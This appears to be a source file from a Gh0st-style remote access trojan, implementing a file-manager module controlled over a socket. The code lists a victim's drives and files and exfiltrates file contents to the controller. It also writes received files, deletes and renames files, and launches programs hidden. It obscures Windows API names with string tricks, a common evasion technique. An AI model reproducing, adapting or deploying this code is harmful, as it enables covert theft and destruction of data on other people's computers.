// FileManager.cpp: implementation of the CFileManager class.
//
//////////////////////////////////////////////////////////////////////

#include "FileManager.h"

typedef struct 
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;
//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////
typedef BOOL(WINAPI *CreateProcessAT)
(
	__in_opt    LPCSTR lpApplicationName,
	__inout_opt LPSTR lpCommandLine,
	__in_opt    LPSECURITY_ATTRIBUTES lpProcessAttributes,
	__in_opt    LPSECURITY_ATTRIBUTES lpThreadAttributes,
	__in        BOOL bInheritHandles,
	__in        DWORD dwCreationFlags,
	__in_opt    LPVOID lpEnvironment,
	__in_opt    LPCSTR lpCurrentDirectory,
	__in        LPSTARTUPINFOA lpStartupInfo,
	__out       LPPROCESS_INFORMATION lpProcessInformation
	);
///////////////////////////////////////////////////////////////////////
//*********************************************************************
CreateProcessAT   pCreateProcessA = (CreateProcessAT)GetProcAddress(LoadLibrary("kernel32.dll"), "CreateProcessA");
//*********************************************************************
/////////////////////////////////////////////////
typedef LPSTR(WINAPI *lstrcpyAT)
(
	__out LPSTR lpString1,
	__in  LPCSTR lpString2
	);
//////////////////////////////////////////////////
lstrcpyAT plstrcpyA = (lstrcpyAT)GetProcAddress(LoadLibrary("kernel32.dll"), strnset("0strcpyA", 'l', 1));

CFileManager::CFileManager(CClientSocket *pClient):CManager(pClient)
{
	m_nTransferMode = TRANSFER_MODE_NORMAL;
	// 發送驅動器列表, 開始進行文件管理，建立新線程
	SendDriveList();
}

CFileManager::~CFileManager()
{
	m_UploadList.clear();
}

void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
	case COMMAND_LIST_FILES:// 獲取文件列表
		SendFilesList((char *)lpBuffer + 1);
		break;
	case COMMAND_DELETE_FILE:// 刪除文件
		DeleteFile((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DELETE_DIRECTORY:// 刪除文件
		////printf("刪除目錄 %s\n", (char *)(bPacket + 1));
		DeleteDirectory((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DOWN_FILES: // 上傳文件
		UploadToRemote(lpBuffer + 1);
		break;
	case COMMAND_CONTINUE: // 上傳文件
		SendFileData(lpBuffer + 1);
		break;
	case COMMAND_CREATE_FOLDER:
		CreateFolder(lpBuffer + 1);
		break;
	case COMMAND_RENAME_FILE:
		Rename(lpBuffer + 1);
		break;
	case COMMAND_STOP:
		StopTransfer();
		break;
	case COMMAND_SET_TRANSFER_MODE:
		SetTransferMode(lpBuffer + 1);
		break;
	case COMMAND_FILE_SIZE:
		CreateLocalRecvFile(lpBuffer + 1);
		break;
	case COMMAND_FILE_DATA:
		WriteLocalRecvFile(lpBuffer + 1, nSize -1);
		break;
	case COMMAND_OPEN_FILE_SHOW:
		OpenFile((char *)lpBuffer + 1, SW_SHOW);
		break;
	case COMMAND_OPEN_FILE_HIDE:
		OpenFile((char *)lpBuffer + 1, SW_HIDE);
		break;
	default:
		break;
	}
}


bool CFileManager::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
    LPTSTR p, pszDirCopy;
    DWORD dwAttributes;

    // Make a copy of the string for editing.

    __try
    {
        pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));

        if(pszDirCopy == NULL)
            return FALSE;

        lstrcpy(pszDirCopy, pszDirPath);

        p = pszDirCopy;

        //  If the second character in the path is "\", then this is a UNC
        //  path, and we should skip forward until we reach the 2nd \ in the path.

        if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\')))
        {
            p++;            // Skip over the first \ in the name.
            p++;            // Skip over the second \ in the name.

            //  Skip until we hit the first "\" (\\Server\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it.

            if(*p)
            {
                p++;
            }

            //  Skip until we hit the second "\" (\\Server\Share\).

            while(*p && *p != TEXT('\\'))
            {
                p = CharNext(p);
            }

            // Advance over it also.

            if(*p)
            {
                p++;
            }

        }
        else if(*(p+1) == TEXT(':')) // Not a UNC.  See if it's <drive>:
        {
            p++;
            p++;

            // If it exists, skip over the root specifier

            if(*p && (*p == TEXT('\\')))
            {
                p++;
            }
        }

		while(*p)
        {
            if(*p == TEXT('\\'))
            {
                *p = TEXT('\0');
                dwAttributes = GetFileAttributes(pszDirCopy);

                // Nothing exists with this name.  Try to make the directory name and error if unable to.
                if(dwAttributes == 0xffffffff)
                {
                    if(!CreateDirectory(pszDirCopy, NULL))
                    {
                        if(GetLastError() != ERROR_ALREADY_EXISTS)
                        {
                            free(pszDirCopy);
                            return FALSE;
                        }
                    }
                }
                else
                {
                    if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
                    {
                        // Something exists with this name, but it's not a directory... Error
                        free(pszDirCopy);
                        return FALSE;
                    }
                }
 
                *p = TEXT('\\');
            }

            p = CharNext(p);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        // SetLastError(GetExceptionCode());
        free(pszDirCopy);
        return FALSE;
    }

    free(pszDirCopy);
    return TRUE;
}
bool CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[500];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	const char	*lpExt = strrchr(lpFile, '.');
	if (!lpExt)
		return false;
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	memset(lpSubKey, 0, sizeof(lpSubKey));
	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
	
	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	RegQueryValue(hKey, NULL, strTemp, &nSize);
	RegCloseKey(hKey);
	
	lpstrCat = strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = strstr(strTemp, "%1");
	
	if (lpstrCat == NULL)
	{
		lstrcat(strTemp, " ");
		lstrcat(strTemp, lpFile);
	}
	else
		lstrcpy(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 
	
	CreateProcess(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
}
typedef BOOL(WINAPI *GetVolumeInformationAT)
(
	__in_opt  LPCSTR lpRootPathName,
	__out_ecount_opt(nVolumeNameSize) LPSTR lpVolumeNameBuffer,
	__in      DWORD nVolumeNameSize,
	__out_opt LPDWORD lpVolumeSerialNumber,
	__out_opt LPDWORD lpMaximumComponentLength,
	__out_opt LPDWORD lpFileSystemFlags,
	__out_ecount_opt(nFileSystemNameSize) LPSTR lpFileSystemNameBuffer,
	__in      DWORD nFileSystemNameSize
	);
///////////////////////////////////////////////////////
typedef BOOL(WINAPI *GetDiskFreeSpaceExAT)
(
	__in_opt  LPCSTR lpDirectoryName,
	__out_opt PULARGE_INTEGER lpFreeBytesAvailableToCaller,
	__out_opt PULARGE_INTEGER lpTotalNumberOfBytes,
	__out_opt PULARGE_INTEGER lpTotalNumberOfFreeBytes
	);
UINT CFileManager::SendDriveList()
{
	GetDiskFreeSpaceExAT   pGetDiskFreeSpaceExA = (GetDiskFreeSpaceExAT)GetProcAddress(LoadLibrary("kernel32.dll"), strnset("0etDiskFreeSpaceExA", 'G', 1));
	GetVolumeInformationAT   pGetVolumeInformationA = (GetVolumeInformationAT)GetProcAddress(LoadLibrary("kernel32.dll"), strnset("0etVolumeInformationA", 'G', 1));
	char	DriveString[256];
	// 前一個字節為令牌，後面的52字節為驅動器跟相關屬性
	BYTE	DriveList[1024];
	char	FileSystem[MAX_PATH];
	char	*pDrive = NULL;
	DriveList[0] = TOKEN_DRIVE_LIST; // 驅動器列表
	GetLogicalDriveStrings(sizeof(DriveString), DriveString);
	pDrive = DriveString;

	unsigned __int64	HDAmount = 0;
	unsigned __int64	HDFreeSpace = 0;
	unsigned long		AmntMB = 0; // 總大小
	unsigned long		FreeMB = 0; // 剩餘空間
	DWORD dwOffset = 1;
	for (; *pDrive != '\0'; pDrive += lstrlen(pDrive) + 1)
	{
		memset(FileSystem, 0, sizeof(FileSystem));
		// 得到文件系統信息及大小
		GetVolumeInformation(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
		SHFILEINFO	sfi;
		SHGetFileInfo(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		
		int	nTypeNameLen = lstrlen(sfi.szTypeName) + 1;
		int	nFileSystemLen = lstrlen(FileSystem) + 1;
		
		// 計算磁盤大小
		if (pDrive[0] != 'A' && pDrive[0] != 'B' && GetDiskFreeSpaceEx(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
		{	
			AmntMB = HDAmount / 1024 / 1024;
			FreeMB = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}
		// 開始賦值
		DriveList[dwOffset] = pDrive[0];
		DriveList[dwOffset + 1] = GetDriveType(pDrive);
		
		
		// 磁盤空間描述占去了8字節
		memcpy(DriveList + dwOffset + 2, &AmntMB, sizeof(unsigned long));
		memcpy(DriveList + dwOffset + 6, &FreeMB, sizeof(unsigned long));
		
		// 磁盤卷標名及磁盤類型
		memcpy(DriveList + dwOffset + 10, sfi.szTypeName, nTypeNameLen);
		memcpy(DriveList + dwOffset + 10 + nTypeNameLen, FileSystem, nFileSystemLen);
		
		dwOffset += 10 + nTypeNameLen + nFileSystemLen;
	}

	return Send((LPBYTE)DriveList, dwOffset);
}


UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
{
	// 重置傳輸方式
	m_nTransferMode = TRANSFER_MODE_NORMAL;	

	UINT	nRet = 0;
	char	strPath[MAX_PATH];
	char	*pszFileName = NULL;
	LPBYTE	lpList = NULL;
	HANDLE	hFile;
	DWORD	dwOffset = 0; // 位移指針
	int		nLen = 0;
	DWORD	nBufferSize =  1024 * 10; // 先分配10K的緩衝區
	WIN32_FIND_DATA	FindFileData;
	
	lpList = (BYTE *)LocalAlloc(LPTR, nBufferSize);
	
	wsprintf(strPath, "%s\\*.*", lpszDirectory);
	hFile = FindFirstFile(strPath, &FindFileData);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		BYTE bToken = TOKEN_FILE_LIST;
		return Send(&bToken, 1);
	}
	
	*lpList = TOKEN_FILE_LIST;
	
	// 1 為數據包頭部所占字節,最後賦值
	dwOffset = 1;
	/*
	文件屬性	1
	文件名		strlen(filename) + 1 ('\0')
	文件大小	4
	*/
	do 
	{
		// 動態擴展緩衝區
		if (dwOffset > (nBufferSize - MAX_PATH * 2))
		{
			nBufferSize += MAX_PATH * 2;
			lpList = (BYTE *)LocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
		pszFileName = FindFileData.cFileName;
		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
			continue;
		// 文件屬性 1 字節
		*(lpList + dwOffset) = FindFileData.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY;
		dwOffset++;
		// 文件名 lstrlen(pszFileName) + 1 字節
		nLen = lstrlen(pszFileName);
		memcpy(lpList + dwOffset, pszFileName, nLen);
		dwOffset += nLen;
		*(lpList + dwOffset) = 0;
		dwOffset++;
		
		// 文件大小 8 字節
		memcpy(lpList + dwOffset, &FindFileData.nFileSizeHigh, sizeof(DWORD));
		memcpy(lpList + dwOffset + 4, &FindFileData.nFileSizeLow, sizeof(DWORD));
		dwOffset += 8;
		// 最後訪問時間 8 字節
		memcpy(lpList + dwOffset, &FindFileData.ftLastWriteTime, sizeof(FILETIME));
		dwOffset += 8;
	} while(FindNextFile(hFile, &FindFileData));

	nRet = Send(lpList, dwOffset);

	LocalFree(lpList);
	FindClose(hFile);
	return nRet;
}


bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	
	wsprintf(lpszFilter, "%s\\*.*", lpszDirectory);
	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果沒有找到或查找失敗
		return FALSE;
	
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile, "%s\\%s", lpszDirectory, wfd.cFileName);
				DeleteFile(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); // 關閉查找句柄
	
	if(!RemoveDirectory(lpszDirectory))
	{
		return FALSE;
	}
	return true;
}



UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
{
	UINT	nRet = 0;
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 1 字節token, 8字節大小, 文件名稱, '\0'
	HANDLE	hFile;
	// 保存當前正在操作的文件名
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, lpszFileName);

	hFile = CreateFile(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	dwSizeLow =	GetFileSize(hFile, &dwSizeHigh);
	CloseHandle(hFile);
	// 構造數據包，發送文件長度
	int		nPacketSize = lstrlen(lpszFileName) + 10;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	bPacket[0] = TOKEN_FILE_SIZE;
	FILESIZE *pFileSize = (FILESIZE *)(bPacket + 1);
	pFileSize->dwSizeHigh = dwSizeHigh;
	pFileSize->dwSizeLow = dwSizeLow;
	memcpy(bPacket + 9, lpszFileName, lstrlen(lpszFileName) + 1);

	nRet = Send(bPacket, nPacketSize);
	LocalFree(bPacket);
	return nRet;
}

UINT CFileManager::SendFileData(LPBYTE lpBuffer)
{
	UINT		nRet;
	FILESIZE	*pFileSize;
	char		*lpFileName;

	pFileSize = (FILESIZE *)lpBuffer;
	lpFileName = m_strCurrentProcessFileName;

	// 遠程跳過，傳送下一個
	if (pFileSize->dwSizeLow == -1)
	{
		UploadNext();
		return 0;
	}
	HANDLE	hFile;
	hFile = CreateFile(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return -1;

	SetFilePointer(hFile, pFileSize->dwSizeLow, (long *)&(pFileSize->dwSizeHigh), FILE_BEGIN);

	int		nHeadLength = 9; // 1 + 4 + 4數據包頭部大小
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;

	LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  大小，偏移，文件名，數據
	lpPacket[0] = TOKEN_FILE_DATA;
	memcpy(lpPacket + 1, pFileSize, sizeof(FILESIZE));
	ReadFile(hFile, lpPacket + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);


	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		nRet = Send(lpPacket, nPacketSize);
	}
	else
	{
		UploadNext();
	}

	LocalFree(lpPacket);

	return nRet;
}
// 傳送下一個文件
void CFileManager::UploadNext()
{
	list <string>::iterator it = m_UploadList.begin();
	// 刪除一個任務
	m_UploadList.erase(it);
	// 還有上傳任務
	if(m_UploadList.empty())
	{
		SendToken(TOKEN_TRANSFER_FINISH);
	}
	else
	{
		// 上傳下一個
		it = m_UploadList.begin();
		SendFileSize((*it).c_str());
	}
}
int CFileManager::SendToken(BYTE bToken)
{
	return Send(&bToken, 1);
}

bool CFileManager::UploadToRemote(LPBYTE lpBuffer)
{

	if (lpBuffer[lstrlen((char *)lpBuffer) - 1] == '\\')
	{
		FixedUploadList((char *)lpBuffer);
		if (m_UploadList.empty())
		{
			StopTransfer();
			return true;
		}
	}
	else
	{
		m_UploadList.push_back((char *)lpBuffer);
	}

	list <string>::iterator it = m_UploadList.begin();
	// 發送第一個文件
	SendFileSize((*it).c_str());

	return true;
}

bool CFileManager::FixedUploadList(LPCTSTR lpPathName)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	//////////////////////////////////////////////////////////

	//把字符串"%s%s%s"連接起來（字符串連接法）
	char *str1 = "%s", *str2 = "%s%s", *str3 = NULL;
	str3 = new char[strlen(str1) + strlen(str2) + 1];
	strcpy(str3, str1);                                 //把str1所指由NULL結束的字符串複製到str3所指的數組中
	strcat(str3, str2);                                 //把str2所指字符串添加到str3結尾處(覆蓋dest結尾處的'\0')並添加'\0'
														//這樣就實現了str3=str1+str2,把str1和str2連接起來了
														//////////////////////////////////////////////////////////
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[lstrlen(lpPathName) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";

	wsprintf(lpszFilter, "%s%s*.*", lpPathName, lpszSlash);

	
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果沒有找到或查找失敗
		return false;
	
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				wsprintf(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
				FixedUploadList(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				wsprintf(strFile, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
				m_UploadList.push_back(strFile);
			}
		}
	} while (FindNextFile(hFind, &wfd));
	
	FindClose(hFind); // 關閉查找句柄
	return true;
}

void CFileManager::StopTransfer()
{
	if (!m_UploadList.empty())
		m_UploadList.clear();
	SendToken(TOKEN_TRANSFER_FINISH);
}

void CFileManager::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	FILESIZE	*pFileSize = (FILESIZE *)lpBuffer;
	// 保存當前正在操作的文件名
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, (char *)lpBuffer + 8);

	// 保存文件長度
	m_nCurrentProcessFileLength = (pFileSize->dwSizeHigh * (MAXDWORD + 1)) + pFileSize->dwSizeLow;
	
	// 創建多層目錄
	MakeSureDirectoryPathExists(m_strCurrentProcessFileName);
	

	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		SendToken(TOKEN_GET_TRANSFER_MODE);
	}
	else
	{
		GetFileData();
	}
	FindClose(hFind);
}

void CFileManager::GetFileData()
{
	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}
	
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strCurrentProcessFileName, &FindFileData);
	
	//  1字節Token,四字節偏移高四位，四字節偏移低四位
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // 文件打開方式 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = TOKEN_DATA_CONTINUE;
	
	// 文件已經存在
	if (hFind != INVALID_HANDLE_VALUE)
	{
		// 提示點什麼
		// 如果是續傳
		if (nTransferMode == TRANSFER_MODE_ADDITION)
		{
			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
		// 覆蓋
		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			// 偏移置0
			memset(bToken + 1, 0, 8);
			// 重新創建
			dwCreationDisposition = CREATE_ALWAYS;
			
		}
		// 傳送下一個
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD dwOffset = -1;
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		// 偏移置0
		memset(bToken + 1, 0, 8);
		// 重新創建
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(hFind);

	HANDLE	hFile = 
		CreateFile
		(
		m_strCurrentProcessFileName, 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		dwCreationDisposition,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	// 需要錯誤處理
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nCurrentProcessFileLength = 0;
		return;
	}
	CloseHandle(hFile);

	Send(bToken, sizeof(bToken));
}

void CFileManager::WriteLocalRecvFile(LPBYTE lpBuffer, UINT nSize)
{
	// 傳輸完畢
	BYTE	*pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite;
	int		nHeadLength = 9; // 1 + 4 + 4  數據包頭部大小，為固定的9
	FILESIZE	*pFileSize;
	// 得到數據的偏移
	pData = lpBuffer + 8;
	
	pFileSize = (FILESIZE *)lpBuffer;

	// 得到數據在文件中的偏移

	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;

	
	dwBytesToWrite = nSize - 8;
	
	HANDLE	hFile = 
		CreateFile
		(
		m_strCurrentProcessFileName,
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	
	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
	
	int nRet = 0;
		// 寫入文件
	nRet = WriteFile
		(
		hFile,
		pData, 
		dwBytesToWrite, 
		&dwBytesWrite,
		NULL
		);
// 	if (nRet <= 0)
// 		printf("文件寫入失敗");
	CloseHandle(hFile);
	// 為了比較，計數器遞增

	BYTE	bToken[9];
	bToken[0] = TOKEN_DATA_CONTINUE;
	dwOffsetLow += dwBytesWrite;
	memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	Send(bToken, sizeof(bToken));
}
void CFileManager::SetTransferMode(LPBYTE lpBuffer)
{
	memcpy(&m_nTransferMode, lpBuffer, sizeof(m_nTransferMode));
	GetFileData();
}

void CFileManager::CreateFolder(LPBYTE lpBuffer)
{
	MakeSureDirectoryPathExists((char *)lpBuffer);
	SendToken(TOKEN_CREATEFOLDER_FINISH);
}

void CFileManager::Rename(LPBYTE lpBuffer)
{
	LPCTSTR lpExistingFileName = (char *)lpBuffer;
	LPCTSTR lpNewFileName = lpExistingFileName + lstrlen(lpExistingFileName) + 1;
	::MoveFile(lpExistingFileName, lpNewFileName);
	SendToken(TOKEN_RENAME_FINISH);
}
